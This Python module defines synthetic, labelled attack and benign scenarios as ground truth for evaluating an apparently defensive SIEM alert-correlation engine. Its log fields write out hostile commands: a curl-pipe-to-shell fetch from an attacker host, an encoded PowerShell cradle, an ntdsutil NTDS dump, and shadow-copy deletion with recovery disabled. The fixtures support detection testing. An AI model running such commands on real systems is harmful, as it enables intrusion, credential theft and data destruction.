"""Planted scenarios for the synthetic corpus.

Each scenario is a list of alert *specs* that the generator renders into the
four wire formats. A spec is a dict with:

    source     "siem" | "syslog" | "geo" | "intel"
    at         ISO-8601 timestamp (UTC)
    ...        source-specific fields (see corpus/generate.py renderers)

`label` is the ground truth used by the evaluation harness:

    "true_positive"  - a genuine multi-stage intrusion the queue must surface
    "benign"         - activity that looks hostile in isolation and must be
                       deprioritised by a suppression rule

Every scenario documents what a reviewer should expect the correlation engine
to do with it, so the ground truth is reviewable rather than a magic file.

Nothing here is real: hosts, users, hashes, addresses and CVE usage are
synthetic, and public-address ranges are RFC 5737/6890 documentation space or
addresses invented for the exercise.
"""

from __future__ import annotations

# Synthetic indicators reused across scenarios so shared-indicator correlation
# has something real to bite on.
H_DOCM = "3f1a9c0b2d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
H_PAYLOAD = "9c7e2b1a5d4f3e2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c"
H_RANSOM = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f9"
H_WEBSHELL = "d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3"
C2_IP = "185.220.101.4"
C2_DOMAIN = "update-cdn.ravensky.net"
LURE_DOMAIN = "ravensky-invoice.com"
SPRAY_IP = "91.240.118.77"
VPN_POOL_IP = "10.20.99.15"
WEB_ATTACKER_IP = "45.142.212.100"
SCANNER_IP = "10.50.1.10"
UAS_TRACK = "TRK-UAS-7731"


SCENARIOS: list[dict] = [
    # ------------------------------------------------------------------
    # S1 - Invoice-themed phishing to credential theft and exfiltration.
    # Four sources contribute. Expected: one incident, top of the queue.
    # ------------------------------------------------------------------
    {
        "key": "S1_PHISH_TO_EXFIL",
        "label": "true_positive",
        "ambiguous": False,
        "title": "RAVEN SKY invoice phishing → PowerShell → C2 → DC01 credential theft → exfiltration",
        "expect": "Single incident spanning MAIL-01, FIN-WS-042 and DC01; deepest tactic exfiltration; ranked in the top 3.",
        "alerts": [
            {"source": "intel", "at": "2026-09-13T18:00:00Z", "report_id_hint": "RAVEN SKY",
             "origin": "Partner CTI exchange", "priority": "HIGH",
             "subject": "RAVEN SKY invoice-lure campaign against defence finance staff",
             "body": (
                 "Partner reporting indicates the actor tracked as RAVEN SKY resumed invoice-themed phishing "
                 "against finance personnel at defence organisations during the week of 8 September. Lures are "
                 f"Word documents with embedded macros sent from the lookalike domain {LURE_DOMAIN.replace('.', '[.]')}. "
                 f"On execution the macro launches PowerShell and retrieves a second stage from hxxp://{C2_DOMAIN.replace('.', '[.]')}/gate.php "
                 f"(resolving to {C2_IP.replace('.', '[.]')}). The second stage has SHA-256 {H_PAYLOAD}. "
                 "Post-exploitation tradecraft observed previously: scheduled-task persistence, LSASS access via "
                 "rundll32, and NTDS extraction on domain controllers prior to bulk exfiltration over the C2 channel. "
                 "Assessed with moderate confidence to be the same cluster reported in April."
             )},
            {"source": "siem", "at": "2026-09-14T09:14:03Z", "rule_id": "EG-1023",
             "rule": "Email attachment matched macro-enabled document heuristics", "severity": "medium", "category": "email",
             "host": "MAIL-01", "user": "CORP\\j.okafor", "src_ip": "198.51.100.77",
             "file": "Q3_Budget_Review.docm", "sha256": H_DOCM,
             "message": f"Inbound message from billing@{LURE_DOMAIN} to j.okafor@corp.example with attachment Q3_Budget_Review.docm (macro-enabled). Delivered; heuristic score 62/100."},
            {"source": "syslog", "at": "2026-09-14T09:21:47Z", "host": "fin-ws-042", "app": "sysmon", "sev": "warning",
             "user": "CORP\\j.okafor",
             "msg": "EventID=1 ProcessCreate Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine=\"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\" User=CORP\\j.okafor ParentCommandLine=\"WINWORD.EXE /n C:\\Users\\j.okafor\\Downloads\\Q3_Budget_Review.docm\""},
            {"source": "siem", "at": "2026-09-14T09:23:10Z", "rule_id": "EDR-4471",
             "rule": "PowerShell download cradle retrieved executable content", "severity": "high", "category": "endpoint",
             "host": "FIN-WS-042", "user": "CORP\\j.okafor", "dst_ip": C2_IP, "url": f"http://{C2_DOMAIN}/gate.php",
             "sha256": H_PAYLOAD, "file": "svchost32.dll",
             "message": f"powershell.exe (encoded command) used Net.WebClient to fetch http://{C2_DOMAIN}/gate.php; wrote C:\\Users\\j.okafor\\AppData\\Roaming\\svchost32.dll (SHA256 {H_PAYLOAD}). Originating document Q3_Budget_Review.docm ({H_DOCM})."},
            {"source": "syslog", "at": "2026-09-14T09:26:30Z", "host": "fin-ws-042", "app": "Microsoft-Windows-TaskScheduler", "sev": "notice",
             "user": "CORP\\j.okafor",
             "msg": "EventID=106 Task registered: \\Microsoft\\Windows\\OneDriveUpdaterTask by CORP\\j.okafor; action rundll32.exe C:\\Users\\j.okafor\\AppData\\Roaming\\svchost32.dll,Start; trigger: at logon and every 30 minutes"},
            {"source": "siem", "at": "2026-09-14T09:31:05Z", "rule_id": "NET-2210",
             "rule": "Periodic outbound connection pattern consistent with beaconing", "severity": "medium", "category": "network",
             "host": "FIN-WS-042", "src_ip": "10.20.14.42", "dst_ip": C2_IP, "dst_port": 443,
             "message": f"10.20.14.42 → {C2_IP}:443 TLS, 41 connections at 60 s ±2 s intervals, JA3 fingerprint not seen before in enclave. SNI {C2_DOMAIN}."},
            {"source": "syslog", "at": "2026-09-14T10:05:12Z", "host": "fin-ws-042", "app": "sysmon", "sev": "err",
             "user": "CORP\\j.okafor",
             "msg": "EventID=10 ProcessAccess SourceImage=C:\\Windows\\System32\\rundll32.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1010 CallTrace=C:\\Users\\j.okafor\\AppData\\Roaming\\svchost32.dll+0x1a2f"},
            {"source": "siem", "at": "2026-09-14T10:40:58Z", "rule_id": "AD-3301",
             "rule": "Privileged network logon from workstation to domain controller", "severity": "high", "category": "authentication",
             "host": "DC01", "user": "CORP\\svc_backup", "src_ip": "10.20.14.42", "dst_ip": "10.20.1.10",
             "message": "EventID 4624 LogonType 3 on DC01 for CORP\\svc_backup from 10.20.14.42 (FIN-WS-042) followed by ADMIN$ share access. svc_backup has never authenticated from a finance workstation."},
            {"source": "syslog", "at": "2026-09-14T10:52:41Z", "host": "dc01", "app": "sysmon", "sev": "crit",
             "user": "CORP\\svc_backup",
             "msg": "EventID=1 ProcessCreate Image=C:\\Windows\\System32\\ntdsutil.exe CommandLine=\"ntdsutil.exe \\\"ac i ntds\\\" \\\"ifm\\\" \\\"create full C:\\Windows\\Temp\\ifm\\\" q q\" User=CORP\\svc_backup ParentImage=C:\\Windows\\System32\\cmd.exe"},
            {"source": "siem", "at": "2026-09-14T11:30:22Z", "rule_id": "DLP-0912",
             "rule": "Large outbound transfer to host with active beaconing alert", "severity": "high", "category": "dlp",
             "host": "FIN-WS-042", "src_ip": "10.20.14.42", "dst_ip": C2_IP, "dst_port": 443,
             "message": f"2.3 GB transferred from 10.20.14.42 to {C2_IP}:443 over 19 minutes inside the existing TLS session. Archive-like entropy. No sanctioned service on that destination."},
        ],
    },
    # ------------------------------------------------------------------
    # S2 - Password spraying at the VPN, one success, internal enumeration.
    # ------------------------------------------------------------------
    {
        "key": "S2_VPN_SPRAY",
        "label": "true_positive",
        "ambiguous": False,
        "title": "VPN password spray → compromised account → AD and share enumeration → bulk file access",
        "expect": "One incident linking VPN-GW-01, DC01 and FILE-SRV-01 through the VPN pool address and account m.novak; ranked in the top 5.",
        "alerts": [
            {"source": "intel", "at": "2026-09-13T12:30:00Z", "report_id_hint": "SPRAY",
             "origin": "National CERT bulletin", "priority": "MEDIUM",
             "subject": "Password-spraying campaign against defence-sector VPN portals",
             "body": (
                 "Multiple defence-sector organisations report low-and-slow password spraying against SSL-VPN "
                 f"portals from {SPRAY_IP.replace('.', '[.]')} and adjacent addresses in the same /24, using seasonal "
                 "password patterns. Successful authentications are followed within an hour by Active Directory group "
                 "enumeration and SMB share discovery. Organisations are advised to review VPN logs for authentications "
                 "from unfamiliar geographies and to enforce MFA on all remote access."
             )},
            {"source": "siem", "at": "2026-09-13T22:10:15Z", "rule_id": "VPN-1180",
             "rule": "Authentication failures across many accounts from single source", "severity": "high", "category": "authentication",
             "host": "VPN-GW-01", "src_ip": SPRAY_IP, "dst_ip": "203.0.113.10",
             "message": f"1,214 failed VPN authentications from {SPRAY_IP} across 43 distinct usernames in 30 minutes (password spraying pattern: 1-2 attempts per account, then rotate)."},
            {"source": "siem", "at": "2026-09-13T22:47:02Z", "rule_id": "VPN-1102",
             "rule": "VPN logon from unfamiliar geography", "severity": "low", "category": "authentication",
             "host": "VPN-GW-01", "user": "CORP\\m.novak", "src_ip": SPRAY_IP,
             "message": f"Successful VPN authentication for CORP\\m.novak from {SPRAY_IP} (GeoIP: MD, Chisinau). Assigned pool address {VPN_POOL_IP}. User has no previous logons outside home country."},
            {"source": "syslog", "at": "2026-09-13T23:05:40Z", "host": "dc01", "app": "Microsoft-Windows-Security-Auditing", "sev": "notice",
             "user": "CORP\\m.novak",
             "msg": f"EventID=4661 A handle to an object was requested: Object Type=SAM_GROUP Object Name=Domain Admins; Subject=CORP\\m.novak; Client Address={VPN_POOL_IP}; Process=net1.exe (net group \"Domain Admins\" /domain)"},
            {"source": "syslog", "at": "2026-09-13T23:20:11Z", "host": "file-srv-01", "app": "smbd", "sev": "warning",
             "user": "CORP\\m.novak",
             "msg": f"Share enumeration: client {VPN_POOL_IP} (CORP\\m.novak) issued NetShareEnumAll and connected to 14 shares in 40 s including finance$, hr$, IT-admin$"},
            {"source": "siem", "at": "2026-09-13T23:41:37Z", "rule_id": "FS-2044",
             "rule": "Abnormal volume of file reads by single account", "severity": "medium", "category": "file",
             "host": "FILE-SRV-01", "user": "CORP\\m.novak", "src_ip": VPN_POOL_IP, "dst_ip": "10.20.2.20",
             "message": f"CORP\\m.novak from {VPN_POOL_IP} read 4,012 files across finance$ and hr$ in 3 minutes (baseline for this account: 30 files/day)."},
        ],
    },
    # ------------------------------------------------------------------
    # S3 - Public-facing exploit to web shell to reverse shell.
    # ------------------------------------------------------------------
    {
        "key": "S3_WEBSHELL",
        "label": "true_positive",
        "ambiguous": False,
        "title": "CVE-2023-22518 exploitation of WEB-DMZ-01 → web shell → cron persistence → reverse shell",
        "expect": "One incident on WEB-DMZ-01 joined by the attacker address and the CVE identifier from the advisory; top 5.",
        "alerts": [
            {"source": "intel", "at": "2026-09-12T16:00:00Z", "report_id_hint": "CVE",
             "origin": "Vendor security advisory (relayed)", "priority": "HIGH",
             "subject": "Active exploitation of CVE-2023-22518 (Confluence improper authorisation)",
             "body": (
                 "Unauthenticated exploitation of CVE-2023-22518 continues against internet-facing Confluence Data "
                 "Center instances. Observed chain: POST to /json/setup-restore.action to reset the instance, upload "
                 f"of a JSP web shell (commonly x.jsp, SHA-256 {H_WEBSHELL}), then a curl-to-shell downloader from the "
                 f"attacker host. Recently observed source {WEB_ATTACKER_IP.replace('.', '[.]')}. Patch immediately and "
                 "review web logs for setup-restore requests."
             )},
            {"source": "siem", "at": "2026-09-13T03:12:08Z", "rule_id": "IDS-7781",
             "rule": "ET EXPLOIT Atlassian Confluence CVE-2023-22518 setup-restore attempt", "severity": "critical", "category": "ids",
             "host": "WEB-DMZ-01", "src_ip": WEB_ATTACKER_IP, "dst_ip": "172.16.5.10", "dst_port": 8090,
             "message": f"Signature match for CVE-2023-22518 in HTTP POST /json/setup-restore.action from {WEB_ATTACKER_IP} to 172.16.5.10:8090."},
            {"source": "syslog", "at": "2026-09-13T03:14:21Z", "host": "web-dmz-01", "app": "httpd", "sev": "info",
             "msg": f"{WEB_ATTACKER_IP} - - \"POST /json/setup-restore.action HTTP/1.1\" 200 1873 \"-\" \"python-requests/2.31\""},
            {"source": "syslog", "at": "2026-09-13T03:15:02Z", "host": "web-dmz-01", "app": "auditd", "sev": "warning",
             "user": "confluence",
             "msg": f"type=PATH name=/opt/atlassian/confluence/webapps/ROOT/x.jsp nametype=CREATE uid=confluence sha256={H_WEBSHELL} — file created by java (tomcat) under web root"},
            {"source": "syslog", "at": "2026-09-13T03:20:49Z", "host": "web-dmz-01", "app": "auditd", "sev": "err",
             "user": "confluence",
             "msg": f"type=EXECVE ppid=java(tomcat) comm=bash a0=/bin/bash a1=-c a2=\"curl -s http://{WEB_ATTACKER_IP}/k.sh | sh\" uid=confluence"},
            {"source": "syslog", "at": "2026-09-13T03:22:15Z", "host": "web-dmz-01", "app": "cron", "sev": "notice",
             "user": "confluence",
             "msg": "(confluence) REPLACE crontab: */5 * * * * /var/tmp/.cache/.k >/dev/null 2>&1"},
            {"source": "siem", "at": "2026-09-13T03:40:33Z", "rule_id": "NET-2288",
             "rule": "Outbound connection from DMZ server to non-standard port", "severity": "medium", "category": "network",
             "host": "WEB-DMZ-01", "src_ip": "172.16.5.10", "dst_ip": WEB_ATTACKER_IP, "dst_port": 4444,
             "message": f"172.16.5.10 → {WEB_ATTACKER_IP}:4444 TCP, long-lived session (38 min), 1.1 MB out / 14 KB in. DMZ egress policy permits 80/443 only; this used a stale rule."},
        ],
    },
    # ------------------------------------------------------------------
    # S4 - Insider staging and exfiltration. No intel, no external C2; the
    # system should still connect it, with medium confidence.
    # ------------------------------------------------------------------
    {
        "key": "S4_INSIDER_EXFIL",
        "label": "true_positive",
        "ambiguous": True,
        "title": "Project FALCON data staged on RND-WS-117 and uploaded to personal cloud storage",
        "expect": "One incident across FILE-SRV-02 and RND-WS-117 joined by user a.mehta; medium confidence; top 10. Ambiguous by design - could be a sanctioned transfer.",
        "alerts": [
            {"source": "syslog", "at": "2026-09-14T12:40:05Z", "host": "file-srv-02", "app": "smbd", "sev": "notice",
             "user": "CORP\\a.mehta",
             "msg": "client 10.20.15.117 (CORP\\a.mehta) read 641 files under \\\\file-srv-02\\projects\\falcon in 11 minutes; typical daily volume for this account is 25"},
            {"source": "syslog", "at": "2026-09-14T13:02:18Z", "host": "rnd-ws-117", "app": "sysmon", "sev": "notice",
             "user": "CORP\\a.mehta",
             "msg": "EventID=11 FileCreate Image=C:\\Program Files\\7-Zip\\7z.exe TargetFilename=C:\\Users\\a.mehta\\AppData\\Local\\Temp\\proj_falcon.7z Size=1,842,113,024 User=CORP\\a.mehta CommandLine=\"7z.exe a -p -mhe=on proj_falcon.7z Z:\\projects\\falcon\\*\""},
            {"source": "siem", "at": "2026-09-14T13:15:44Z", "rule_id": "PRX-0550",
             "rule": "Large upload to personal cloud storage service", "severity": "medium", "category": "proxy",
             "host": "RND-WS-117", "user": "CORP\\a.mehta", "src_ip": "10.20.15.117", "dst_ip": "31.216.148.10", "url": "https://mega.nz/",
             "message": "1.84 GB uploaded to mega.nz (31.216.148.10) from 10.20.15.117 by CORP\\a.mehta in a single session. mega.nz is not an approved service."},
            {"source": "siem", "at": "2026-09-14T13:20:09Z", "rule_id": "DLP-0930",
             "rule": "Classification marking detected in outbound encrypted archive metadata", "severity": "high", "category": "dlp",
             "host": "RND-WS-117", "user": "CORP\\a.mehta", "src_ip": "10.20.15.117", "dst_ip": "31.216.148.10",
             "message": "Outbound archive proj_falcon.7z: file listing contains 'PROJECT FALCON - RESTRICTED' markings on 212 entries. Encrypted payload; content not inspectable."},
        ],
    },
    # ------------------------------------------------------------------
    # S5 - Physical/cyber convergence at SITE-ALPHA: geospatial tracks,
    # RF, rogue wireless, OT tampering. Geo and intel are load-bearing here.
    # ------------------------------------------------------------------
    {
        "key": "S5_SITE_ALPHA_CLOSE_ACCESS",
        "label": "true_positive",
        "ambiguous": False,
        "title": "UAS loiter and RF emitter at SITE-ALPHA → rogue AP → unknown device on OT VLAN → unauthorised PLC write",
        "expect": "One incident joining geo tracks, wireless controller, NAC and OT sensor alerts through the SITE-ALPHA subnet and site reference; deepest tactic impact; top 3.",
        "alerts": [
            {"source": "intel", "at": "2026-09-13T20:00:00Z", "report_id_hint": "UAS",
             "origin": "Field HUMINT summary", "priority": "MEDIUM",
             "subject": "Suspected hostile UAS reconnaissance of northern communications stations",
             "body": (
                 "Local sources report repeated night-time small-UAS activity in the vicinity of SITE-ALPHA and "
                 "another northern relay over the past seven days, with at least one sighting of a vehicle parked "
                 "on the access track during a flight. Assessed as pre-operational reconnaissance for a close-access "
                 "attempt against site communications or control systems. Recommend heightened RF monitoring and "
                 "review of wireless and OT network access at SITE-ALPHA."
             )},
            {"source": "geo", "at": "2026-09-14T02:10:30Z", "track_id": UAS_TRACK, "sensor": "RADAR-N2", "site": "SITE-ALPHA",
             "lat": 64.1412, "lon": 21.9273, "object_class": "small_uas", "alert_type": "loiter_near_perimeter",
             "confidence": 0.82, "priority": "P2", "speed": 12, "heading": 275,
             "notes": "Unregistered small UAS loitering 400 m from SITE-ALPHA perimeter for 9 min; no flight plan; no transponder"},
            {"source": "geo", "at": "2026-09-14T02:18:05Z", "track_id": "EMT-RF-0193", "sensor": "RF-DF-ALPHA", "site": "SITE-ALPHA",
             "lat": 64.1431, "lon": 21.9310, "object_class": "rf_emitter", "alert_type": "unknown_emitter",
             "confidence": 0.74, "priority": "P2", "speed": 0, "heading": 0,
             "notes": f"2.4 GHz burst emitter geolocated 350 m NE of SITE-ALPHA, co-located with track {UAS_TRACK}; decoded 802.11 management frames at high rate from BSSID 3c:22:fb:9a:11:07"},
            {"source": "syslog", "at": "2026-09-14T02:25:12Z", "host": "site-alpha-wlc", "app": "wlc", "sev": "err",
             "msg": "Rogue AP detected: SSID=\"SITE-ALPHA-OPS\" BSSID=3c:22:fb:9a:11:07 impersonating corporate SSID; 412 deauthentication frames observed against legitimate clients in 60 s (evil-twin / adversary-in-the-middle pattern)"},
            {"source": "siem", "at": "2026-09-14T02:31:46Z", "rule_id": "NAC-0410",
             "rule": "Unknown device admitted to restricted VLAN", "severity": "medium", "category": "nac",
             "host": "SITE-ALPHA-SW-03", "src_ip": "10.30.1.77",
             "message": "MAC 3c:22:fb:9a:11:07 (vendor: unknown) joined VLAN 30 (OT) via SITE-ALPHA-SW-03 port Gi1/0/14 (equipment room, external door); assigned 10.30.1.77; MAC not in asset register."},
            {"source": "syslog", "at": "2026-09-14T02:44:03Z", "host": "scada-hmi-01", "app": "hmi-auth", "sev": "warning",
             "msg": "37 failed operator logons from 10.30.1.77 in 4 minutes (accounts: operator, engineer, admin, maint); then successful logon as maint"},
            {"source": "siem", "at": "2026-09-14T03:02:27Z", "rule_id": "OT-9001",
             "rule": "Modbus write from host outside engineering allowlist", "severity": "critical", "category": "ot",
             "host": "PLC-ALPHA-01", "src_ip": "10.30.1.77", "dst_ip": "10.30.1.20", "dst_port": 502,
             "message": "Modbus/TCP function code 16 (Write Multiple Registers) from 10.30.1.77 to PLC-ALPHA-01 (10.30.1.20): 6 holding registers changed (antenna azimuth/elevation setpoints). Source is not an approved engineering workstation."},
        ],
    },
    # ------------------------------------------------------------------
    # S6 - Ambiguous benign: a sysadmin doing exactly what an attacker does,
    # inside a change window from the admin workstation.
    # ------------------------------------------------------------------
    {
        "key": "S6_MAINTENANCE_ADMIN",
        "label": "benign",
        "ambiguous": True,
        "title": "Backup agent rollout during change window CHG-2026-0911 by r.tanaka from ADM-WS-002",
        "expect": "Correlates into one incident (it genuinely looks like persistence + lateral movement) but suppression rules MAINTENANCE_WINDOW and ADMIN_FROM_ADMIN_WORKSTATION fire; ranked below every true positive.",
        "alerts": [
            {"source": "syslog", "at": "2026-09-13T23:35:20Z", "host": "backup-01", "app": "Microsoft-Windows-Service-Control-Manager", "sev": "notice",
             "user": "CORP\\r.tanaka",
             "msg": "EventID=7045 A service was installed in the system. Service Name: VeeamTransportSvc; Image Path: C:\\Program Files\\Veeam\\Backup Transport\\VeeamTransportSvc.exe; Account: LocalSystem; installed by CORP\\r.tanaka from 10.20.10.2"},
            {"source": "syslog", "at": "2026-09-13T23:38:44Z", "host": "backup-01", "app": "sysmon", "sev": "notice",
             "user": "CORP\\r.tanaka",
             "msg": "EventID=1 ProcessCreate Image=C:\\Windows\\PSEXESVC.exe ParentImage=C:\\Windows\\System32\\services.exe User=NT AUTHORITY\\SYSTEM — PsExec service session initiated from 10.20.10.2 (ADM-WS-002) by CORP\\r.tanaka"},
            {"source": "siem", "at": "2026-09-13T23:50:31Z", "rule_id": "EDR-4510",
             "rule": "Scheduled task created by remote session", "severity": "medium", "category": "endpoint",
             "host": "FILE-SRV-01", "user": "CORP\\r.tanaka", "src_ip": "10.20.10.2", "dst_ip": "10.20.2.20",
             "message": "Task \\Veeam\\BackupVerify registered on FILE-SRV-01 by CORP\\r.tanaka via remote schtasks from 10.20.10.2; runs daily 01:00 as SYSTEM."},
            {"source": "syslog", "at": "2026-09-14T00:10:09Z", "host": "file-srv-01", "app": "sysmon", "sev": "warning",
             "user": "CORP\\r.tanaka",
             "msg": "EventID=1 ProcessCreate Image=C:\\Windows\\System32\\vssadmin.exe CommandLine=\"vssadmin list shadows\" User=CORP\\r.tanaka ParentImage=C:\\Windows\\System32\\cmd.exe"},
        ],
    },
    # ------------------------------------------------------------------
    # S7 - Authorised vulnerability scan. The vendor marks every hit CRITICAL.
    # This is the `why_deprioritised` demonstration.
    # ------------------------------------------------------------------
    {
        "key": "S7_AUTHORISED_SCAN",
        "label": "benign",
        "ambiguous": False,
        "title": "Scheduled vulnerability scan from SCAN-01 against the server VLAN (vendor severity CRITICAL)",
        "expect": "Alerts share SCAN-01's address and cluster tightly in time. Suppression rule KNOWN_SCANNER_RANGE fires with the scan schedule as evidence; the incident sits near the bottom of the queue despite eight vendor-CRITICAL alerts.",
        "alerts": [
            {"source": "siem", "at": "2026-09-14T06:00:12Z", "rule_id": "IDS-2001", "rule": "ET SCAN Nmap SYN scan detected", "severity": "critical", "category": "ids",
             "host": "DC01", "src_ip": SCANNER_IP, "dst_ip": "10.20.1.10", "message": f"SYN scan: {SCANNER_IP} probed 1,000 ports on 10.20.1.10 in 12 s."},
            {"source": "siem", "at": "2026-09-14T06:01:40Z", "rule_id": "IDS-2001", "rule": "ET SCAN Nmap SYN scan detected", "severity": "critical", "category": "ids",
             "host": "DC02", "src_ip": SCANNER_IP, "dst_ip": "10.20.1.11", "message": f"SYN scan: {SCANNER_IP} probed 1,000 ports on 10.20.1.11 in 11 s."},
            {"source": "syslog", "at": "2026-09-14T06:02:05Z", "host": "dc01", "app": "Windows-Firewall", "sev": "warning",
             "msg": f"Port scan detected from {SCANNER_IP}: 1,000 blocked inbound connection attempts in 15 s"},
            {"source": "siem", "at": "2026-09-14T06:04:22Z", "rule_id": "IDS-2001", "rule": "ET SCAN Nmap SYN scan detected", "severity": "critical", "category": "ids",
             "host": "FILE-SRV-01", "src_ip": SCANNER_IP, "dst_ip": "10.20.2.20", "message": f"SYN scan: {SCANNER_IP} probed 1,000 ports on 10.20.2.20 in 12 s."},
            {"source": "siem", "at": "2026-09-14T06:05:51Z", "rule_id": "IDS-2001", "rule": "ET SCAN Nmap SYN scan detected", "severity": "critical", "category": "ids",
             "host": "FILE-SRV-02", "src_ip": SCANNER_IP, "dst_ip": "10.20.2.21", "message": f"SYN scan: {SCANNER_IP} probed 1,000 ports on 10.20.2.21 in 13 s."},
            {"source": "syslog", "at": "2026-09-14T06:06:30Z", "host": "file-srv-01", "app": "Windows-Firewall", "sev": "warning",
             "msg": f"Port scan detected from {SCANNER_IP}: 998 blocked inbound connection attempts in 14 s"},
            {"source": "siem", "at": "2026-09-14T06:08:03Z", "rule_id": "IDS-2001", "rule": "ET SCAN Nmap SYN scan detected", "severity": "critical", "category": "ids",
             "host": "MAIL-01", "src_ip": SCANNER_IP, "dst_ip": "10.20.2.25", "message": f"SYN scan: {SCANNER_IP} probed 1,000 ports on 10.20.2.25 in 12 s."},
            {"source": "siem", "at": "2026-09-14T06:09:47Z", "rule_id": "IDS-2001", "rule": "ET SCAN Nmap SYN scan detected", "severity": "critical", "category": "ids",
             "host": "BACKUP-01", "src_ip": SCANNER_IP, "dst_ip": "10.20.2.30", "message": f"SYN scan: {SCANNER_IP} probed 1,000 ports on 10.20.2.30 in 12 s."},
            {"source": "syslog", "at": "2026-09-14T06:10:15Z", "host": "backup-01", "app": "Windows-Firewall", "sev": "warning",
             "msg": f"Port scan detected from {SCANNER_IP}: 1,000 blocked inbound connection attempts in 13 s"},
            {"source": "siem", "at": "2026-09-14T06:12:31Z", "rule_id": "IDS-2005", "rule": "ET SCAN Nessus/OpenVAS vulnerability probe", "severity": "critical", "category": "ids",
             "host": "PRINT-SRV-01", "src_ip": SCANNER_IP, "dst_ip": "10.20.2.40", "message": f"Vulnerability check signatures (SMB, HTTP, SNMP) from {SCANNER_IP} against 10.20.2.40."},
            {"source": "siem", "at": "2026-09-14T06:14:09Z", "rule_id": "IDS-2005", "rule": "ET SCAN Nessus/OpenVAS vulnerability probe", "severity": "critical", "category": "ids",
             "host": "DNS-01", "src_ip": SCANNER_IP, "dst_ip": "10.20.1.53", "message": f"Vulnerability check signatures (DNS, SNMP) from {SCANNER_IP} against 10.20.1.53."},
            {"source": "syslog", "at": "2026-09-14T06:15:02Z", "host": "print-srv-01", "app": "Windows-Firewall", "sev": "warning",
             "msg": f"Port scan detected from {SCANNER_IP}: 1,000 blocked inbound connection attempts in 12 s"},
        ],
    },
    # ------------------------------------------------------------------
    # S8 - Ransomware detonation on FILE-SRV-02. Fast, loud, top of queue.
    # ------------------------------------------------------------------
    {
        "key": "S8_RANSOMWARE",
        "label": "true_positive",
        "ambiguous": False,
        "title": "Shadow-copy deletion, recovery tampering and mass encryption on FILE-SRV-02",
        "expect": "Tight temporal cluster on one critical asset reaching impact; ranked first or second.",
        "alerts": [
            {"source": "siem", "at": "2026-09-14T16:02:11Z", "rule_id": "EDR-4602",
             "rule": "Volume shadow copies deleted", "severity": "high", "category": "endpoint",
             "host": "FILE-SRV-02", "user": "CORP\\svc_fileops", "src_ip": "10.20.2.21",
             "message": "vssadmin.exe delete shadows /all /quiet executed by CORP\\svc_fileops via cmd.exe on FILE-SRV-02."},
            {"source": "syslog", "at": "2026-09-14T16:03:04Z", "host": "file-srv-02", "app": "sysmon", "sev": "err",
             "user": "CORP\\svc_fileops",
             "msg": "EventID=1 ProcessCreate Image=C:\\Windows\\System32\\bcdedit.exe CommandLine=\"bcdedit /set {default} recoveryenabled no\" User=CORP\\svc_fileops ParentImage=C:\\ProgramData\\svchost_.exe"},
            {"source": "siem", "at": "2026-09-14T16:04:30Z", "rule_id": "EDR-4610",
             "rule": "Unsigned binary masquerading as system process", "severity": "high", "category": "endpoint",
             "host": "FILE-SRV-02", "user": "CORP\\svc_fileops", "sha256": H_RANSOM, "file": "svchost_.exe",
             "message": f"C:\\ProgramData\\svchost_.exe (SHA256 {H_RANSOM}) is unsigned and not the Windows svchost.exe; spawned bcdedit.exe and vssadmin.exe; high-entropy sections."},
            {"source": "syslog", "at": "2026-09-14T16:06:18Z", "host": "file-srv-02", "app": "fsaudit", "sev": "crit",
             "user": "CORP\\svc_fileops",
             "msg": "12,418 rename operations in 90 s under D:\\shares\\projects: files renamed with extension .lockbit; process C:\\ProgramData\\svchost_.exe"},
            {"source": "siem", "at": "2026-09-14T16:07:02Z", "rule_id": "AV-0071",
             "rule": "Ransom note artefact created in multiple directories", "severity": "critical", "category": "endpoint",
             "host": "FILE-SRV-02", "user": "CORP\\svc_fileops", "file": "RESTORE-FILES.txt",
             "message": "RESTORE-FILES.txt written to 318 directories on D:\\shares in 60 s. Content references .onion negotiation portal."},
        ],
    },
]
